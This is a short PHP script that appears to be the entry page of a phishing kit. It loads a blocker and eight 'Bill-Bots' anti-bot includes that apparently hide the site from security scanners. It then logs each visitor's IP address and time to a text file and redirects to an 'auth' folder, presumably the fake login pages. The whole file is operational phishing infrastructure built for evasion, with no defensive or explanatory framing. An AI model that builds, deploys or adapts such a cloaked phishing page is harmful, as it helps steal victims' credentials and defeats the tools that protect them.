<?php
include("./auth/system/blocker.php");
include("./Bill-Bots/anti1.php");
include("./Bill-Bots/anti2.php");
include("./Bill-Bots/anti3.php");
include("./Bill-Bots/anti4.php");
include("./Bill-Bots/anti5.php");
include("./Bill-Bots/anti6.php");
include("./Bill-Bots/anti7.php");
include("./Bill-Bots/anti8.php");
$ip = getenv("REMOTE_ADDR");
$file = fopen("Visitor's IP.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$src="auth";
header("location:$src");
?>
